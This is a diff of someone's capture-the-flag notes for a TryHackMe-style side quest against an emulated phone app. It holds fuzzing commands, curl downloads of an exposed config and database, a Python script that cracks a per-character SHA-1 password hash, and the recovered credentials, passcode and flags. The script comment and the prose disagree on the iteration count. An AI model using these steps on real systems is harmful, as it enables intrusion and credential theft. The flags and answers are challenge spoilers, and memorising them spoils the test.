@@ -4,14 +4,18 @@
 
 |================================================================
 - Name: 
-- IP Address: 10.65.166.164
+- IP Address: 10.64.142.189
 - OS: 
 - Notes: 
 
 //CREDS:
+	PHONE_PASSCODE = "210701"
+	HOPFLIX:
+		sbreachblocker@easterbunnies.thm | malharerocks
 
 //Flags:
 	THM{eggsposed_source_code}
+	THM{fluffier_things_season_4}
 
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -39,7 +43,7 @@ throne123*
 
 //The device looks innocent enough: a Hopflix streaming app, a banking app, messages, photos, and settings. But nothing about this op is innocent. Hopper must somehow pivot into the linked bank account, and, outsmarting the layered authentication around it, he can wrest control of the funds before King Malhare’s cronies move them for good. If he succeeds, The Best Festival Company is saved; if he fails, the story of “Colonel Panic” ends in quiet disgrace, erased like so many secrets before.
 
-ip=10.65.166.164
+ip=10.64.142.189
 
 //This Side Quest is unlocked by finding the Side Quest key in Advent of Cyber Day 21. Once you’ve recovered that key, visit http://$ip:21337 and enter it to unlock Hopper’s challenge. From there, your mission is simple to state and hard to execute: break into Sir BreachBlocker’s phone, bypass all authentication, and recover the final key needed to release the funds for The Best Festival Company.
 
@@ -98,7 +102,9 @@ PORT   STATE         SERVICE
 //https://$ip:8443/
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
-Checking the HTTPS server on port 8443, we see an emulated mobile phone interface with the Hopflix and Hopsec Bank applications. However, both applications require credentials, which we do not have at this stage.
+//This is a phone landing page, there is a mobile portal with a few apps installed.
+
+//Checking the HTTPS server on port 8443, we see an emulated mobile phone interface with the Hopflix and Hopsec Bank applications. However, both applications require credentials, which we do not have at this stage.
 
 
 -- feroxbuster --
@@ -118,7 +124,7 @@ feroxbuster -k -u https://$ip:8443/ -w /usr/share/dirb/wordlists/big.txt --scan-
 200  https://10.65.166.164:8443/requirements.txt
 
 
-feroxbuster -k -u https://$ip:8443/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt
+feroxbuster -k -u https://$ip:8443/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --scan-limit 2 -o feroxbuster_8443_quickhits.out
 
 200  https://10.65.166.164:8443/breaky.png
 200  https://10.65.166.164:8443/main.js
@@ -139,11 +145,30 @@ curl -k https://10.65.166.164:8443/main.py -o main.py
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
-// First Flag
-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-We do not get much from the phone interface, apart from seeing it connect to several API endpoints. Instead, by fuzzing the application with quickhits.txt, we can discover the nginx.conf file.
+//I need an account number and a pin to sign into the banking app, so let’s enumerate the phone some more.
 
-ffuf -u 'https://10.65.166.164:8443/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 100 -mc all -ic -fc 404
+//The email field in Hopflix is prefilled which grants Sir BreachBlocker’s email. Checking the inbox discloses that the charity funds are locked.
+
+
+//HOPFLIX
+sbreachblocker@easterbunnies.thm
+
+
+//There are some interesting text messages to say the least but the only other thing of note was an option to disable the face id on the authenticator, however that requires a 6 digit passcode.
+
+//A bit more digging and I found a phone passcode hardcoded in main.js
+
+const PHONE_PASSCODE = "210701"
+
+//I turned off the authenticator face id so I don’t have issues in the future.
+
+
+// First Flag
+//What's the CODE_FLAG?
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//There is not much to get from the phone interface, apart from seeing it connect to several API endpoints. Instead, by fuzzing the application with quickhits.txt, I discover the nginx.conf file.
+
+ffuf -k -u "https://10.64.142.189:8443/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 100 -mc all -ic -fc 404
 
 //NOTE:
 -mc all
@@ -156,11 +181,12 @@ ffuf -u 'https://10.65.166.164:8443/FUZZ' -w /usr/share/seclists/Discovery/Web-C
 	Filter out HTTP 404 responses
 	Removes “Not Found” noise
 
+//Lets read the Nginx configuration directly.
+
+curl -k https://$ip:8443/nginx.conf -o nginx.conf
 
 // nginx.conf
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-curl -k https://10.65.166.164:8443/nginx.conf
-
 user  nginx;
 worker_processes 4;
 error_log  /var/log/nginx/error.log warn;
@@ -211,13 +237,89 @@ daemon off;
 
 
 // Second Flag
+//What's the HOPFLIX_FLAG?
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 //The leaked source code also references two database files: hopflix-874297.db and hopsecbank-12312497.db. Attempting to retrieve them shows that hopsecbank-12312497.db does not exist in the web root, but hopflix-874297.db does.
 
+curl -k https://$ip:8443/hopflix-874297.db -o hopflix-874297.db
+//Got it
 
+curl -k https://$ip:8443/hopsecbank-12312497.db
+//Nothing
+
+file hopflix-874297.db
+hopflix-874297.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
+
+sqlite3 hopflix-874297.db
+
+//List all Tables
+sqlite> .tables
+users
+
+//Dumping the database reveals a suspiciously long hash for the user sbreachblocker@easterbunnies.thm.
+
+//Dump Database
+sqlite> .dump
+PRAGMA foreign_keys=OFF;
+BEGIN TRANSACTION;
+CREATE TABLE users (email text, full_name text, password_hash text);
+INSERT INTO users VALUES('sbreachblocker@easterbunnies.thm','Sir BreachBlocker','03c96ceff1a9758a1ea7c3cb8d43264616949d88b5914c97bdedb1ab511a85c480d49b77c4977520ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c19b23990d991560019487301ef9926d9d99a2962b5914c97bdedb1ab511a85c480d49b77c49775207dc2d45214515ff55726de5fc73d5bd5500b3e86fa6c34156f954d4435e838f6852c6476217104207dc2d45214515ff55726de5fc73d5bd5500b3e86504fa1cfe6a6f5d5c407f673dd67d71a34cbb0772c21afa8b8f0b5e1c1a377b7168e542ea41f67a696e4c3dda73fa679990918ab333b6fab8c8e5f2296e56d15f089c659a1bbc1d2b6f70b6c80720f1a');
+COMMIT;
+
+//Make note:
+echo '03c96ceff1a9758a1ea7c3cb8d43264616949d88b5914c97bdedb1ab511a85c480d49b77c4977520ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c19b23990d991560019487301ef9926d9d99a2962b5914c97bdedb1ab511a85c480d49b77c49775207dc2d45214515ff55726de5fc73d5bd5500b3e86fa6c34156f954d4435e838f6852c6476217104207dc2d45214515ff55726de5fc73d5bd5500b3e86504fa1cfe6a6f5d5c407f673dd67d71a34cbb0772c21afa8b8f0b5e1c1a377b7168e542ea41f67a696e4c3dda73fa679990918ab333b6fab8c8e5f2296e56d15f089c659a1bbc1d2b6f70b6c80720f1a' > sbreachblocker.hash
+
+//The Hopflix authentication system implements a non-standard password hashing scheme where each password character is hashed independently using repeated SHA-1, then concatenated. This design allows the password to be recovered character-by-character offline using the database dump and application source code.
+
+//Inspecting the login logic shows that the password hash is constructed by taking each character of the password, hashing it with SHA-1 for 5000 iterations, and then concatenating the results.
+
+// flag2_solve.py
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+import hashlib
+import string
+
+HASH_HEX = "03c96ceff1a9758a1ea7c3cb8d43264616949d88b5914c97bdedb1ab511a85c480d49b77c4977520ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c19b23990d991560019487301ef9926d9d99a2962b5914c97bdedb1ab511a85c480d49b77c49775207dc2d45214515ff55726de5fc73d5bd5500b3e86fa6c34156f954d4435e838f6852c6476217104207dc2d45214515ff55726de5fc73d5bd5500b3e86504fa1cfe6a6f5d5c407f673dd67d71a34cbb0772c21afa8b8f0b5e1c1a377b7168e542ea41f67a696e4c3dda73fa679990918ab333b6fab8c8e5f2296e56d15f089c659a1bbc1d2b6f70b6c80720f1a"
+
+ITERATIONS = 1000  # <-- IMPORTANT: this hash file matches 1000, not 5000
+CHUNK_SIZE = 40
+
+def chain_sha1(s: str, n: int) -> str:
+    res = s
+    for _ in range(n):
+        res = hashlib.sha1(res.encode()).hexdigest()
+    return res
+
+chunks = [HASH_HEX[i:i+CHUNK_SIZE] for i in range(0, len(HASH_HEX), CHUNK_SIZE)]
+
+# Build rainbow table for printable ASCII
+alphabet = ''.join(chr(i) for i in range(32, 127))  # space..~
+lookup = {chain_sha1(ch, ITERATIONS): ch for ch in alphabet}
+
+password = ''.join(lookup.get(c, '?') for c in chunks)
+print(password)
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
+//WebSite
+	https://$ip:8443/
+
+//Creds
+	sbreachblocker@easterbunnies.thm | malharerocks
+
+
+//THM{fluffier_things_season_4}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Third Flag
+//What's the BANK_FLAG?
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+Find This!
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 
